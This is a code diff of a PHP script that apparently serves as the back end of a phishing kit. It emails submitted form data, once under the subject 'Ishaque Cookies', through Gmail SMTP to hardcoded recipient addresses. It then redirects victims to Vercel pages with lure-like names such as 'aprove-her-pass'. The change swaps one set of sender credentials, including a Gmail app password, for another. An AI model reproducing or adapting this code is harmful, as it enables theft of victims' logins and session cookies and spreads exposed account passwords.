@@ -2,9 +2,9 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-ccczqz4cd1pfr6008-support.vercel.app/");
+header("Location: https://aprove-her-pass.vercel.app/");
 
-require 'Exception.php';
+require 'Exception.php'; 
 require 'PHPMailer.php';
 require 'SMTP.php';
 
@@ -27,23 +27,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'herereplit@gmail.com'; // Replace with your email address
-        $mail->Password   = 'welc oltq mcnf txvn'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('herereplit@gmail.com', 'Hello DK');
-        $mail->addAddress('ishaqueniz741@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
+        $mail->setFrom('aliumair0044@gmail.com', 'PK');
+        $mail->addAddress('aliumair0044@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Ishaque Cookies';
+        $mail->Subject = 'Zohaib';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
